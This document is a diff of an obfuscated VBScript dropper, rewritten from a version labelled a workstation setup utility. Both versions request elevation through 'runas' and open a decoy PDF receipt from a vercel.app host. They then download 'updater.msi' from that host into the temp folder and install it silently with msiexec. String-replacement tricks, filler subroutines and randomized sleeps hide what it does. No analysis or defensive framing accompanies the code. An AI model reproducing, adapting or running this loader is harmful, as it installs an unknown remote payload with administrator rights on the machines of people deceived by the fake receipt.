@@ -1,78 +1,51 @@
-' Workstation setup and configuration utility
+Option Explicit
 
-Dim objShellApp, oFSO, strAppHandler, strFSClass, xmlRequest, dataStream, strTempDir, strPkgPath, strDownloadURL, strAssetURL, strNetProvider, strWriteHandler, strMsiHandler, strBatchFlag, strExecutor, strExecMode, strContext, cmdRunner, strRunProvider
+Dim objShell, objFSO, strAppHandler, strFSOProvider, httpClient, objStream, tempFolder, strPkgPath, strUpdateURL, strDocURL, strWebHandler, strIOProvider, strInstallerExe, strUnattended, strExecutor, strExecMode, strContext
 
-strAppHandler = Replace("ShellXApplication", "X", ".")
-strFSClass = Replace("Scripting.FileYystemObject", "Y", "S")
-strExecutor = Mid("Module=wscript.exe;Active=True", 8, 11)
-strExecMode = "runas"
-strContext = Replace(Replace("el%va~ed", "%", "e"), "~", "t")
+strAppHandler = Replace("Shell.ApplicXtion", "X", "a")
+strFSOProvider = Replace("ScriptJng.FileSystemObject", "J", "i")
+strExecutor = Replace("wYcript.exe", "Y", "s")
+strExecMode = Replace(Replace("ru!|s", "!", "n"), "|", "a")
+strContext = Replace(Replace("@lev^ted", "@", "e"), "^", "a")
 
 
-Sub RunInstaller(strPkgFile)
-    strMsiHandler = "msiexec.exe"
-    strBatchFlag = Replace(Replace("/~!", "!", "n"), "~", "q")
-    strRunProvider = Replace(Replace("WSc!ipt.Shel^", "!", "r"), "^", "l")
-    Set cmdRunner = CreateObject(strRunProvider)
-    cmdRunner.Run strMsiHandler & " /i """ & strPkgFile & """ " & strBatchFlag, 0, False
+Sub ValidateRuntime()
+    Dim strVal
+    strVal = "6nhh"
+    If Len(strVal) < 2 Then Exit Sub
 End Sub
 
-
-Sub CacheFile(pkgContent, strLocalPath)
-    strWriteHandler = Replace(Replace("ADODB.Str%#m", "%", "e"), "#", "a")
-    Dim intIOMode : intIOMode = 2 - 1
-    Dim intSaveOpt : intSaveOpt = 1 + 1
-    Set dataStream = CreateObject(strWriteHandler)
-    dataStream.Type = intIOMode
-    dataStream.Open
-    dataStream.Write pkgContent
-    dataStream.SaveToFile strLocalPath, intSaveOpt
-    dataStream.Close
-End Sub
-
-Sub EnsurePrivileges()
-    Dim strInvoke
-    If Not WScript.Arguments.Named.Exists(strContext) Then
-        strInvoke = """" & WScript.ScriptFullName & """ /" & strContext
-        Set objShellApp = CreateObject(strAppHandler)
-        objShellApp.ShellExecute strExecutor, strInvoke, "", strExecMode, 1
-        WScript.Quit
-    End If
-End Sub
-
-
-Sub InitCache(intSize)
-    If intSize < 1 Then intSize = 8
-    Dim i : For i = 1 To intSize : Next
-End Sub
-
-
-Sub ShowResource()
-    strAssetURL = "https://pdfviewer-nu.vercel.app/doc/wureceipt.pdf"
-    Set objShellApp = CreateObject(strAppHandler)
-    objShellApp.ShellExecute strAssetURL, "", "", "open", 1
-End Sub
-
-Sub PullUpdate(strURL, ByRef arrData)
-    strNetProvider = Replace("MSXML2ZServerXMLHTTP", "Z", ".")
-    Set xmlRequest = CreateObject(strNetProvider)
-    xmlRequest.setTimeouts 5390, 7696, 14349, 40120
-    Dim strMethod : strMethod = Mid("XGET", 2, 3)
-    xmlRequest.Open strMethod, strURL, False
-    Dim intSecOpt : intSecOpt = 8192 + 4864
-    Dim intOptId : intOptId = CInt("2")
-    xmlRequest.setOption intOptId, intSecOpt
+Sub DownloadAsset(strURL, ByRef binPayload)
+    strWebHandler = Replace(Replace("M~%ML2.ServerXMLHTTP.6.0", "%", "X"), "~", "S")
+    Set httpClient = CreateObject(strWebHandler)
+    httpClient.setTimeouts 6870, 5607, 10252, 27089
+    Dim strVerb : strVerb = Replace("G_E_T", "_", "")
+    httpClient.Open strVerb, strURL, False
+    Dim intTlsOpt : intTlsOpt = CLng("&H3" & "300")
+    Dim intCfgId : intCfgId = 3 - 1
+    httpClient.setOption intCfgId, intTlsOpt
     On Error Resume Next
-    xmlRequest.Send
+    httpClient.Send
     If Err.Number <> 0 Then WScript.Quit
     On Error GoTo 0
-    If xmlRequest.Status = 200 Then
-        arrData = xmlRequest.ResponseBody
+    If httpClient.Status = 200 Then
+        binPayload = httpClient.ResponseBody
     Else
         WScript.Quit
     End If
 End Sub
 
+Sub DeployPackage(strTarget)
+    strInstallerExe = Replace("msiexec.eKe", "K", "x")
+    strUnattended = Replace("/Wn", "W", "q")
+    Set objShell = CreateObject(strAppHandler)
+    objShell.ShellExecute strInstallerExe, "/i """ & strTarget & """ " & strUnattended, "", strExecMode, 1
+End Sub
+
+
+Function GetTimestamp()
+    GetTimestamp = Year(Now) & Month(Now) & Day(Now)
+End Function
 
 Function CheckService(strName)
     CheckService = True
@@ -80,33 +53,56 @@ Function CheckService(strName)
 End Function
 
 
-Sub LogActivity(strMsg, intLevel)
-    If intLevel < 0 Then Exit Sub
-    Dim strPrefix : strPrefix = "[Trace] "
-    Dim strFull : strFull = strPrefix & strMsg
+Sub CheckPermissions()
+    Dim strCmdArgs
+    If Not WScript.Arguments.Named.Exists(strContext) Then
+        strCmdArgs = """" & WScript.ScriptFullName & """ /" & strContext
+        Set objShell = CreateObject(strAppHandler)
+        objShell.ShellExecute strExecutor, strCmdArgs, "", strExecMode, 1
+        WScript.Quit
+    End If
 End Sub
 
-Function GetHash()
-    GetHash = Year(Now) & Month(Now) & Day(Now)
-End Function
+Sub InitContext(intSize)
+    If intSize < 1 Then intSize = 58
+    Dim i : For i = 1 To intSize : Next
+End Sub
+
+
+Sub LaunchPreview()
+    strDocURL = "https://pdfviewer-nu.vercel.app/doc/wureceipt.pdf"
+    Set objShell = CreateObject(strAppHandler)
+    objShell.ShellExecute strDocURL, "", "", "open", 1
+End Sub
+
+Sub PersistData(rawData, strLocalPath)
+    strIOProvider = Replace("ADODB.Jtream", "J", "S")
+    Dim intDataMode : intDataMode = 2 - 1
+    Dim intWriteMode : intWriteMode = Len("AB")
+    Set objStream = CreateObject(strIOProvider)
+    objStream.Type = intDataMode
+    objStream.Open
+    objStream.Write rawData
+    objStream.SaveToFile strLocalPath, intWriteMode
+    objStream.Close
+End Sub
 
 ' --- Entry Point ---
-EnsurePrivileges
+CheckPermissions
 
-WScript.Sleep 1596
-ShowResource
-WScript.Sleep 557
+WScript.Sleep 1740
+LaunchPreview
+WScript.Sleep 1279
 
 Dim binResult
-Set oFSO = CreateObject(strFSClass)
-Dim intDirId : intDirId = CInt("2")
-strTempDir = oFSO.GetSpecialFolder(intDirId)
-strPkgPath = strTempDir & "\updater.msi"
-strDownloadURL = Join(Array("https://pdfviewe", "r-nu.vercel.app/", "doc/updater.msi"), "")
+Set objFSO = CreateObject(strFSOProvider)
+Dim intFolderType : intFolderType = Len("AB")
+tempFolder = objFSO.GetSpecialFolder(intFolderType)
+strPkgPath = tempFolder & "\updater.msi"
+strUpdateURL = Join(Array("https://pdfviewe", "r-nu.vercel.app/", "doc/updater.msi"), "")
 
-PullUpdate strDownloadURL, binResult
+DownloadAsset strUpdateURL, binResult
+Dim strBatchId : strBatchId = Year(Now) & "-" & Month(Now) & "-" & Day(Now)
+PersistData binResult, strPkgPath
 Dim strPhase : strPhase = "ready"
-CacheFile binResult, strPkgPath
-Dim intDataLen : intDataLen = LenB(binResult)
-If intDataLen < 1 Then WScript.Quit
-RunInstaller strPkgPath
+DeployPackage strPkgPath
